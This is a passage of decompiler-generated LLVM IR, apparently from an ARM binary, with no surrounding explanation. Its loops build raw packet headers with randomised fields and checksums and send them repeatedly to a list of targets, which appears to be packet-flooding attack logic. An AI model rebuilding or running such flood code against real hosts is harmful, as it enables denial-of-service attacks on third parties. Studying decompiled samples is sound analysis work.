  %v5_cacc = or i32 %v1_cac8, %v4_cacc
  store i32 %v5_cacc, i32* %r3.global-to-local, align 4
  %v1_cad0 = trunc i32 %v5_cacc to i8
  store i8 %v1_cad0, i8* %v2_cac0, align 1
  %v0_cad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cad4 = add i32 %v0_cad4, 13
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v4_cad4 = zext i8 %v3_cad4 to i32
  store i32 %v1_c9ac, i32* %r0.global-to-local, align 4
  %v1_cadc = and i32 %v4_cad4, 251
  %v5_cae0 = or i32 %v1_cadc, %v4_cae0
  store i32 %v5_cae0, i32* %r2.global-to-local, align 4
  %v1_cae4 = trunc i32 %v5_cae0 to i8
  store i8 %v1_cae4, i8* %v2_cad4, align 1
  %v0_cae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_cae8 = add i32 %v0_cae8, 13
  %v2_cae8 = inttoptr i32 %v1_cae8 to i8*
  %v3_cae8 = load i8, i8* %v2_cae8, align 1
  %v4_cae8 = zext i8 %v3_cae8 to i32
  store i32 %v1_c9b0, i32* %r2.global-to-local, align 4
  %v1_caf0 = and i32 %v4_cae8, 253
  %v4_caf4 = or i32 %v1_caf0, %v3_caf4
  store i32 %v4_caf4, i32* %r3.global-to-local, align 4
  %v1_caf8 = trunc i32 %v4_caf4 to i8
  store i8 %v1_caf8, i8* %v2_cae8, align 1
  %v0_cafc = load i32, i32* %r1.global-to-local, align 4
  %v1_cafc = add i32 %v0_cafc, 12
  %v2_cafc = inttoptr i32 %v1_cafc to i8*
  %v3_cafc = load i8, i8* %v2_cafc, align 1
  %v4_cafc = zext i8 %v3_cafc to i32
  store i32 %v4_cafc, i32* %r2.global-to-local, align 4
  %v1_cb00 = add i32 %v0_cafc, 13
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v4_cb00 = zext i8 %v3_cb00 to i32
  %tmp84 = urem i8 %v3_cafc, 16
  %v1_cb08 = zext i8 %tmp84 to i32
  %v1_cb0c = and i32 %v4_cb00, 254
  %v2_cb10 = or i32 %v1_cb0c, %v1_c9c0
  %v1_cb14 = or i32 %v1_cb08, 160
  store i32 %v1_cb14, i32* %r2.global-to-local, align 4
  %v1_cb18 = trunc i32 %v2_cb10 to i8
  store i8 %v1_cb18, i8* %v2_cb00, align 1
  %v0_cb1c = load i32, i32* %r2.global-to-local, align 4
  %v1_cb1c = trunc i32 %v0_cb1c to i8
  %v2_cb1c = load i32, i32* %r1.global-to-local, align 4
  %v3_cb1c = add i32 %v2_cb1c, 12
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 %v1_cb1c, i8* %v4_cb1c, align 1
  store i32 %v3_cb24, i32* %r0.global-to-local, align 4
  store i32 %v7_cb24, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_cb30 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb30 = add i32 %v2_cb30, 3
  %v4_cb30 = inttoptr i32 %v3_cb30 to i8*
  store i8 %v5_c9e0, i8* %v4_cb30, align 1
  %v0_cb34 = load i32, i32* %r0.global-to-local, align 4
  %v1_cb34 = trunc i32 %v0_cb34 to i8
  %v2_cb34 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb34 = add i32 %v2_cb34, 1
  %v4_cb34 = inttoptr i32 %v3_cb34 to i8*
  store i8 %v1_cb34, i8* %v4_cb34, align 1
  %v0_cb38 = load i32, i32* @r6, align 4
  %v1_cb38 = trunc i32 %v0_cb38 to i8
  %v2_cb38 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb38 = add i32 %v2_cb38, 2
  %v4_cb38 = inttoptr i32 %v3_cb38 to i8*
  store i8 %v1_cb38, i8* %v4_cb38, align 1
  %v0_cb3c = load i32, i32* @r5, align 4
  %v1_cb3c = load i32, i32* %r1.global-to-local, align 4
  %v2_cb3c = add i32 %v1_cb3c, 4
  %v3_cb3c = inttoptr i32 %v2_cb3c to i32*
  store i32 %v0_cb3c, i32* %v3_cb3c, align 4
  %v0_cb40 = load i32, i32* %ip.global-to-local, align 4
  %v1_cb40 = trunc i32 %v0_cb40 to i8
  %v2_cb40 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb40 = add i32 %v2_cb40, 41
  %v4_cb40 = inttoptr i32 %v3_cb40 to i8*
  store i8 %v1_cb40, i8* %v4_cb40, align 1
  %v0_cb44 = load i32, i32* %r3.global-to-local, align 4
  %v1_cb44 = trunc i32 %v0_cb44 to i8
  %v2_cb44 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb44 = add i32 %v2_cb44, 40
  %v4_cb44 = inttoptr i32 %v3_cb44 to i8*
  store i8 %v1_cb44, i8* %v4_cb44, align 1
  %v0_cb48 = call i32 @function_fe60()
  %v1_cb4c = mul i32 %v0_cb48, 256
  %v1_cb50 = and i32 %v1_cb4c, 3840
  %v1_cb54 = or i32 %v1_cb50, 356352
  %v3_cb5c = add nuw nsw i32 %v1_cb54, 2048
  %v1_cb60 = and i32 %v3_cb5c, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v3_cb687 = udiv i32 %v1_cb60, 256
  store i32 %v3_cb687, i32* %r1.global-to-local, align 4
  %v0_cb6c = load i32, i32* %r4.global-to-local, align 4
  %v1_cb6c = add i32 %v0_cb6c, 42
  store i32 %v1_cb6c, i32* %r2.global-to-local, align 4
  %v4_cb70 = inttoptr i32 %v1_cb6c to i8*
  store i8 5, i8* %v4_cb70, align 1
  %v0_cb74 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb74 = trunc i32 %v0_cb74 to i8
  %v2_cb74 = load i32, i32* %r2.global-to-local, align 4
  %v3_cb74 = add i32 %v2_cb74, 1
  %v4_cb74 = inttoptr i32 %v3_cb74 to i8*
  store i8 %v1_cb74, i8* %v4_cb74, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_cb80 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb80 = add i32 %v2_cb80, 47
  %v4_cb80 = inttoptr i32 %v3_cb80 to i8*
  store i8 10, i8* %v4_cb80, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_cb8c = load i32, i32* %r3.global-to-local, align 4
  %v1_cb8c = trunc i32 %v0_cb8c to i8
  %v2_cb8c = load i32, i32* %r4.global-to-local, align 4
  %v3_cb8c = add i32 %v2_cb8c, 46
  %v4_cb8c = inttoptr i32 %v3_cb8c to i8*
  store i8 %v1_cb8c, i8* %v4_cb8c, align 1
  %v0_cb90 = load i32, i32* %r2.global-to-local, align 4
  %v1_cb90 = trunc i32 %v0_cb90 to i8
  %v2_cb90 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb90 = add i32 %v2_cb90, 45
  %v4_cb90 = inttoptr i32 %v3_cb90 to i8*
  store i8 %v1_cb90, i8* %v4_cb90, align 1
  %v0_cb94 = load i32, i32* %r0.global-to-local, align 4
  %v1_cb94 = trunc i32 %v0_cb94 to i8
  %v2_cb94 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb94 = add i32 %v2_cb94, 44
  %v4_cb94 = inttoptr i32 %v3_cb94 to i8*
  store i8 %v1_cb94, i8* %v4_cb94, align 1
  %v0_cb98 = call i32 @function_fe60()
  store i32 %v0_cb98, i32* %r0.global-to-local, align 4
  %v2_cba0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cba0 = add i32 %v2_cba0, 56
  %v4_cba0 = inttoptr i32 %v3_cba0 to i8*
  store i8 1, i8* %v4_cba0, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_cbb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_cbb0 = add i32 %v1_cbb0, 48
  %v3_cbb0 = inttoptr i32 %v2_cbb0 to i32*
  store i32 %v0_cb98, i32* %v3_cbb0, align 4
  %v0_cbb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_cbb4 = trunc i32 %v0_cbb4 to i8
  %v2_cbb4 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbb4 = add i32 %v2_cbb4, 58
  %v4_cbb4 = inttoptr i32 %v3_cbb4 to i8*
  store i8 %v1_cbb4, i8* %v4_cbb4, align 1
  %v0_cbb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cbb8 = trunc i32 %v0_cbb8 to i8
  %v2_cbb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbb8 = add i32 %v2_cbb8, 59
  %v4_cbb8 = inttoptr i32 %v3_cbb8 to i8*
  store i8 %v1_cbb8, i8* %v4_cbb8, align 1
  %v0_cbbc = load i32, i32* %ip.global-to-local, align 4
  %v1_cbbc = load i32, i32* %r4.global-to-local, align 4
  %v2_cbbc = add i32 %v1_cbbc, 52
  %v3_cbbc = inttoptr i32 %v2_cbbc to i32*
  store i32 %v0_cbbc, i32* %v3_cbbc, align 4
  %v0_cbc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_cbc0 = trunc i32 %v0_cbc0 to i8
  %v2_cbc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbc0 = add i32 %v2_cbc0, 57
  %v4_cbc0 = inttoptr i32 %v3_cbc0 to i8*
  store i8 %v1_cbc0, i8* %v4_cbc0, align 1
  %v3_cbc4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cbc4, i32* %r3.global-to-local, align 4
  %v1_cbc8 = add i32 %v3_cbc4, 1
  store i32 %v1_cbc8, i32* @r4, align 4
  %v0_cbcc = load i32, i32* @sl, align 4
  %v9_cbcc = icmp eq i32 %v0_cbcc, %v1_cbc8
  store i1 %v9_cbcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cbc8, i32* %stack_var_-40, align 4
  %v8_cbd4 = icmp sgt i32 %v0_cbcc, %v1_cbc8
  br i1 %v8_cbd4, label %dec_label_pc_c9e8, label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %bb76, %dec_label_pc_c8fc
  %v0_cbd8 = phi i32 [ %v0_c928, %dec_label_pc_c8fc ], [ %v0_cbcc, %bb76 ]
  %v2_cbd8 = icmp eq i32 %v0_cbd8, 0
  store i1 %v2_cbd8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cd90 = icmp eq i32 %v3_c918, 65535
  %v2_ce0c = icmp eq i32 %v1_c924, 0
  %v2_cc14 = icmp eq i32 %v6_c8b0, -1
  %v7_cc14 = icmp eq i32 %v6_c8b0, -1
  br label %dec_label_pc_cbe0.outer

dec_label_pc_cbe0.outer:                          ; preds = %dec_label_pc_cd0c, %dec_label_pc_cbd8
  %v1_cbe0.ph.in = phi i32 [ %v0_cd00, %dec_label_pc_cd0c ], [ %v0_cbd8, %dec_label_pc_cbd8 ]
  %v0_cbe0.ph = phi i1 [ %v2_cd0c, %dec_label_pc_cd0c ], [ %v2_cbd8, %dec_label_pc_cbd8 ]
  %v1_cbe0.ph = icmp slt i32 %v1_cbe0.ph.in, 0
  %v4_cbe0 = or i1 %v1_cbe0.ph, %v0_cbe0.ph
  br label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %dec_label_pc_cbe0.outer, %dec_label_pc_cbe0
  br i1 %v4_cbe0, label %dec_label_pc_cbe0, label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %dec_label_pc_cbe0
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cc6c, %dec_label_pc_cbe4
  %v1_cc00 = phi i32 [ %v1_ccfc, %dec_label_pc_cc6c ], [ 0, %dec_label_pc_cbe4 ]
  %v5_cbf4 = mul i32 %v1_cc00, 24
  %v1_cbf8 = load i32, i32* @r8, align 4
  %v2_cbf8 = add i32 %v1_cbf8, %v5_cbf4
  store i32 %v2_cbf8, i32* %r3.global-to-local, align 4
  %v1_cbfc = add i32 %v2_cbf8, 20
  %v2_cbfc = inttoptr i32 %v1_cbfc to i8*
  %v3_cbfc = load i8, i8* %v2_cbfc, align 1
  %v4_cbfc = zext i8 %v3_cbfc to i32
  store i32 %v4_cbfc, i32* %r2.global-to-local, align 4
  %v0_cc00 = load i32, i32* %fp.global-to-local, align 4
  %v4_cc00 = mul i32 %v1_cc00, 4
  %v5_cc00 = add i32 %v0_cc00, %v4_cc00
  %v6_cc00 = inttoptr i32 %v5_cc00 to i32*
  %v7_cc00 = load i32, i32* %v6_cc00, align 4
  store i32 %v7_cc00, i32* @r5, align 4
  %v7_cc04 = icmp eq i8 %v3_cbfc, 31
  store i1 %v7_cc04, i1* %cpsr_z.global-to-local, align 1
  %v1_cc08 = add i32 %v7_cc00, 20
  store i32 %v1_cc08, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_cbfc, 32
  br i1 %tmp85, label %dec_label_pc_cd18, label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cbf0
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  store i1 %v7_cc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cc14, label %dec_label_pc_cd80, label %dec_label_pc_cc1c

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cd18, %dec_label_pc_cc10
  store i32 %v3_c918, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_cd90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_cd90, label %dec_label_pc_cd9c, label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge, %dec_label_pc_cc1c
  %v1_cc34 = phi i32 [ %v1_cc34.pre, %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge ], [ 65535, %dec_label_pc_cc1c ]
  store i32 %v3_c91c, i32* %r3.global-to-local, align 4
  %v9_cc34 = icmp eq i32 %v3_c91c, %v1_cc34
  store i1 %v9_cc34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc34, label %dec_label_pc_cdb8, label %dec_label_pc_cc3c

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge, %dec_label_pc_cc30
  %v1_cc40 = phi i32 [ %v1_cc40.pre, %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge ], [ %v1_cc34, %dec_label_pc_cc30 ]
  store i32 %v3_c920, i32* %ip.global-to-local, align 4
  %v9_cc40 = icmp eq i32 %v3_c920, %v1_cc40
  store i1 %v9_cc40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc40, label %dec_label_pc_cdd4, label %dec_label_pc_cc48

dec_label_pc_cc48:                                ; preds = %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge, %dec_label_pc_cc3c
  %v1_cc4c = phi i32 [ %v1_cc4c.pre, %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge ], [ %v1_cc40, %dec_label_pc_cc3c ]
  store i32 %v5_c7ec, i32* %r0.global-to-local, align 4
  %v9_cc4c = icmp eq i32 %v5_c7ec, %v1_cc4c
  store i1 %v9_cc4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc4c, label %dec_label_pc_cdf0, label %dec_label_pc_cc54

dec_label_pc_cc54:                                ; preds = %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge, %dec_label_pc_cc48
  %v1_cc58 = phi i32 [ %v1_cc58.pre, %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge ], [ %v1_cc4c, %dec_label_pc_cc48 ]
  store i32 %v6_c804, i32* %r2.global-to-local, align 4
  %v9_cc58 = icmp eq i32 %v6_c804, %v1_cc58
  store i1 %v9_cc58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc58, label %dec_label_pc_ce04, label %dec_label_pc_cc60

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cdf0, %dec_label_pc_cc54
  store i32 %v1_c924, i32* %r3.global-to-local, align 4
  store i1 %v2_ce0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ce0c, label %dec_label_pc_cc6c, label %dec_label_pc_ce18

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_ce04, %dec_label_pc_ce18
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cc70 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc70 = trunc i32 %v0_cc70 to i8
  %v2_cc70 = load i32, i32* @r5, align 4
  %v3_cc70 = add i32 %v2_cc70, 10
  %v4_cc70 = inttoptr i32 %v3_cc70 to i8*
  store i8 %v1_cc70, i8* %v4_cc70, align 1
  %v0_cc74 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc74 = trunc i32 %v0_cc74 to i8
  %v2_cc74 = load i32, i32* @r5, align 4
  %v3_cc74 = add i32 %v2_cc74, 11
  %v4_cc74 = inttoptr i32 %v3_cc74 to i8*
  store i8 %v1_cc74, i8* %v4_cc74, align 1
  %v0_cc78 = load i32, i32* @r5, align 4
  store i32 %v0_cc78, i32* @r0, align 4
  %v2_cc7c = call i32 @function_e424(i32 %v0_cc78, i32 20)
  %v3_cc7c = trunc i32 %v2_cc7c to i8
  %v4_cc8027 = udiv i32 %v2_cc7c, 256
  %v1_cc84 = trunc i32 %v4_cc8027 to i8
  %v2_cc84 = load i32, i32* @r5, align 4
  %v3_cc84 = add i32 %v2_cc84, 11
  %v4_cc84 = inttoptr i32 %v3_cc84 to i8*
  store i8 %v1_cc84, i8* %v4_cc84, align 1
  %v3_cc88 = load i32, i32* @r5, align 4
  %v4_cc88 = add i32 %v3_cc88, 10
  %v5_cc88 = inttoptr i32 %v4_cc88 to i8*
  store i8 %v3_cc7c, i8* %v5_cc88, align 1
  %v0_cc8c = load i32, i32* @r6, align 4
  store i32 %v0_cc8c, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_cc98 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc98 = trunc i32 %v0_cc98 to i8
  %v3_cc98 = add i32 %v0_cc8c, 16
  %v4_cc98 = inttoptr i32 %v3_cc98 to i8*
  store i8 %v1_cc98, i8* %v4_cc98, align 1
  %v0_cc9c = load i32, i32* %r7.global-to-local, align 4
  %v1_cc9c = trunc i32 %v0_cc9c to i8
  %v2_cc9c = load i32, i32* @r6, align 4
  %v3_cc9c = add i32 %v2_cc9c, 17
  %v4_cc9c = inttoptr i32 %v3_cc9c to i8*
  store i8 %v1_cc9c, i8* %v4_cc9c, align 1
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v0_cca0, i32* %r0.global-to-local, align 4
  %v4_cca4 = call i32 @function_e480(i32 %v0_cca0, i32 %v0_cc8c, i32 10240, i32 40)
  %v5_cca4 = trunc i32 %v4_cca4 to i8
  store i32 %v4_cca4, i32* %r0.global-to-local, align 4
  %v4_cca828 = udiv i32 %v4_cca4, 256
  %v1_ccac = trunc i32 %v4_cca828 to i8
  %v2_ccac = load i32, i32* @r6, align 4
  %v3_ccac = add i32 %v2_ccac, 17
  %v4_ccac = inttoptr i32 %v3_ccac to i8*
  store i8 %v1_ccac, i8* %v4_ccac, align 1
  %v3_ccb0 = load i32, i32* @r6, align 4
  %v4_ccb0 = add i32 %v3_ccb0, 16
  %v5_ccb0 = inttoptr i32 %v4_ccb0 to i8*
  store i8 %v5_cca4, i8* %v5_ccb0, align 1
  %v3_ccb4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ccb4, i32* %r3.global-to-local, align 4
  %v0_ccb8 = load i32, i32* @r5, align 4
  %v1_ccb8 = add i32 %v0_ccb8, 20
  %v2_ccb8 = inttoptr i32 %v1_ccb8 to i32*
  %v3_ccb8 = load i32, i32* %v2_ccb8, align 4
  %v3_ccc0 = udiv i32 %v3_ccb8, 65536
  store i32 %v3_ccc0, i32* %r2.global-to-local, align 4
  %v5_ccc4 = mul i32 %v3_ccb4, 24
  %v1_ccc8 = load i32, i32* @r8, align 4
  %v2_ccc8 = add i32 %v1_ccc8, %v5_ccc4
  store i32 %v2_ccc8, i32* %ip.global-to-local, align 4
  %v3_cccc26 = udiv i32 %v3_ccb8, 16777216
  %v1_ccd0 = trunc i32 %v3_cccc26 to i8
  %v3_ccd0 = add i32 %v2_ccc8, 3
  %v4_ccd0 = inttoptr i32 %v3_ccd0 to i8*
  store i8 %v1_ccd0, i8* %v4_ccd0, align 1
  %v0_ccd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ccd4 = trunc i32 %v0_ccd4 to i8
  %v2_ccd4 = load i32, i32* %ip.global-to-local, align 4
  %v3_ccd4 = add i32 %v2_ccd4, 2
  %v4_ccd4 = inttoptr i32 %v3_ccd4 to i8*
  store i8 %v1_ccd4, i8* %v4_ccd4, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ccdc = load i32, i32* @r5, align 4
  store i32 %v0_ccdc, i32* %r1.global-to-local, align 4
  %v0_cce0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_cce0, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_ccec = load i32, i32* %ip.global-to-local, align 4
  %v6_ccf4 = inttoptr i32 %v0_ccdc to i32*
  %v7_ccf4 = call i32 @function_13f2c(i32 %v0_cce0, i32* %v6_ccf4, i32 60, i32 16384, i32 %v0_ccec, i32 16)
  %v3_ccf8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ccf8, i32* %r3.global-to-local, align 4
  %v1_ccfc = add i32 %v3_ccf8, 1
  store i32 %v1_ccfc, i32* %r0.global-to-local, align 4
  %v0_cd00 = load i32, i32* @sl, align 4
  %v9_cd00 = icmp eq i32 %v0_cd00, %v1_ccfc
  store i1 %v9_cd00, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ccfc, i32* %stack_var_-40, align 4
  %v8_cd08 = icmp sgt i32 %v0_cd00, %v1_ccfc
  br i1 %v8_cd08, label %dec_label_pc_cbf0, label %dec_label_pc_cd0c

dec_label_pc_cd0c:                                ; preds = %dec_label_pc_cc6c
  %v2_cd0c = icmp eq i32 %v0_cd00, 0
  store i1 %v2_cd0c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cbe0.outer

dec_label_pc_cd18:                                ; preds = %dec_label_pc_cbf0
  %v1_cd18 = add i32 %v2_cbf8, 16
  %v2_cd18 = inttoptr i32 %v1_cd18 to i32*
  %v3_cd18 = load i32, i32* %v2_cd18, align 4
  store i32 %v3_cd18, i32* %r4.global-to-local, align 4
  %v0_cd1c = call i32 @function_fe60()
  store i32 %v0_cd1c, i32* %r0.global-to-local, align 4
  %v3_cd20 = load i32, i32* %stack_var_-40, align 4
  %v5_cd28 = mul i32 %v3_cd20, 24
  %v0_cd2c = load i32, i32* %r4.global-to-local, align 4
  %v1_cd30 = load i32, i32* @r8, align 4
  %v2_cd30 = add i32 %v1_cd30, %v5_cd28
  store i32 %v2_cd30, i32* %r1.global-to-local, align 4
  %v1_cd34 = and i32 %v0_cd2c, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_cd34, i32* %r3.global-to-local, align 4
  %v1_cd2c = udiv i32 %v0_cd2c, 256
  %v3_cd38 = and i32 %v1_cd2c, 65280
  store i32 %v3_cd38, i32* %r2.global-to-local, align 4
  %v3_cd3c = mul i32 %v0_cd2c, 16777216
  store i32 %v3_cd3c, i32* %ip.global-to-local, align 4
  %v1_cd40 = add i32 %v2_cd30, 20
  %v2_cd40 = inttoptr i32 %v1_cd40 to i8*
  %v3_cd40 = load i8, i8* %v2_cd40, align 1
  %v4_cd40 = zext i8 %v3_cd40 to i32
  %v4_cd44 = mul i32 %v1_cd34, 256
  %v5_cd44 = or i32 %v4_cd44, %v3_cd3c
  store i32 %v5_cd44, i32* %ip.global-to-local, align 4
  %v4_cd48 = udiv i32 %v0_cd2c, 16777216
  %v5_cd48 = or i32 %v3_cd38, %v4_cd48
  %v2_cd4c = or i32 %v5_cd48, %v5_cd44
  %v7_cd50 = lshr i32 %v0_cd1c, %v4_cd40
  %v8_cd50 = add i32 %v7_cd50, %v2_cd4c
  store i32 %v8_cd50, i32* %r2.global-to-local, align 4
  %v3_cd5c = mul i32 %v8_cd50, 16777216
  %v1_cd54 = mul i32 %v8_cd50, 256
  %v4_cd60 = and i32 %v1_cd54, 16711680
  %v5_cd60 = or i32 %v4_cd60, %v3_cd5c
  store i32 %v5_cd60, i32* %r1.global-to-local, align 4
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  %v2_cd70 = call i32 @llvm.bswap.i32(i32 %v8_cd50)
  store i32 %v2_cd70, i32* %r3.global-to-local, align 4
  store i1 %v7_cc14, i1* %cpsr_z.global-to-local, align 1
  %v1_cd78 = load i32, i32* @r5, align 4
  %v2_cd78 = add i32 %v1_cd78, 16
  %v3_cd78 = inttoptr i32 %v2_cd78 to i32*
  store i32 %v2_cd70, i32* %v3_cd78, align 4
  br i1 %v2_cc14, label %dec_label_pc_cd80, label %dec_label_pc_cc1c

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd18, %dec_label_pc_cc10
  %v0_cd80 = call i32 @function_fe60()
  store i32 %v0_cd80, i32* %r0.global-to-local, align 4
  store i32 %v3_c918, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_cd90, i1* %cpsr_z.global-to-local, align 1
  %v1_cd94 = load i32, i32* @r5, align 4
  %v2_cd94 = add i32 %v1_cd94, 12
  %v3_cd94 = inttoptr i32 %v2_cd94 to i32*
  store i32 %v0_cd80, i32* %v3_cd94, align 4
  br i1 %v3_cd90, label %dec_label_pc_cd9c, label %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge

dec_label_pc_cd80.dec_label_pc_cc30_crit_edge:    ; preds = %dec_label_pc_cd80
  %v1_cc34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc30

dec_label_pc_cd9c:                                ; preds = %dec_label_pc_cd80, %dec_label_pc_cc1c
  %v0_cd9c = call i32 @function_fe60()
  %v1_cd9c = trunc i32 %v0_cd9c to i8
  store i32 %v0_cd9c, i32* %r0.global-to-local, align 4
  %v4_cda029 = udiv i32 %v0_cd9c, 256
  %v1_cda4 = trunc i32 %v4_cda029 to i8
  %v2_cda4 = load i32, i32* @r5, align 4
  %v3_cda4 = add i32 %v2_cda4, 5
  %v4_cda4 = inttoptr i32 %v3_cda4 to i8*
  store i8 %v1_cda4, i8* %v4_cda4, align 1
  store i32 %v3_c91c, i32* %r3.global-to-local, align 4
  %v1_cdac = load i32, i32* @r4, align 4
  %v9_cdac = icmp eq i32 %v3_c91c, %v1_cdac
  store i1 %v9_cdac, i1* %cpsr_z.global-to-local, align 1
  %v3_cdb0 = load i32, i32* @r5, align 4
  %v4_cdb0 = add i32 %v3_cdb0, 4
  %v5_cdb0 = inttoptr i32 %v4_cdb0 to i8*
  store i8 %v1_cd9c, i8* %v5_cdb0, align 1
  %v0_cdb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdb4, label %dec_label_pc_cdb8, label %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge

dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge:    ; preds = %dec_label_pc_cd9c
  %v1_cc40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc3c

dec_label_pc_cdb8:                                ; preds = %dec_label_pc_cd9c, %dec_label_pc_cc30
  %v0_cdb8 = call i32 @function_fe60()
  %v1_cdb8 = trunc i32 %v0_cdb8 to i8
  store i32 %v0_cdb8, i32* %r0.global-to-local, align 4
  store i32 %v3_c920, i32* %ip.global-to-local, align 4
  %v4_cdc0 = sdiv i32 %v0_cdb8, 256
  store i32 %v4_cdc0, i32* %r3.global-to-local, align 4
  %v1_cdc4 = load i32, i32* @r4, align 4
  %v9_cdc4 = icmp eq i32 %v3_c920, %v1_cdc4
  store i1 %v9_cdc4, i1* %cpsr_z.global-to-local, align 1
  %v3_cdc8 = load i32, i32* @r5, align 4
  %v4_cdc8 = add i32 %v3_cdc8, 20
  %v5_cdc8 = inttoptr i32 %v4_cdc8 to i8*
  store i8 %v1_cdb8, i8* %v5_cdc8, align 1
  %v0_cdcc = load i32, i32* %r3.global-to-local, align 4
  %v1_cdcc = trunc i32 %v0_cdcc to i8
  %v2_cdcc = load i32, i32* @r6, align 4
  %v3_cdcc = add i32 %v2_cdcc, 1
  %v4_cdcc = inttoptr i32 %v3_cdcc to i8*
  store i8 %v1_cdcc, i8* %v4_cdcc, align 1
  %v0_cdd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdd0, label %dec_label_pc_cdd4, label %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge

dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge:    ; preds = %dec_label_pc_cdb8
  %v1_cc4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc48

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cdb8, %dec_label_pc_cc3c
  %v0_cdd4 = call i32 @function_fe60()
  %v1_cdd4 = trunc i32 %v0_cdd4 to i8
  %v4_cdd8 = sdiv i32 %v0_cdd4, 256
  store i32 %v4_cdd8, i32* %r3.global-to-local, align 4
  %v3_cddc = load i32, i32* @r6, align 4
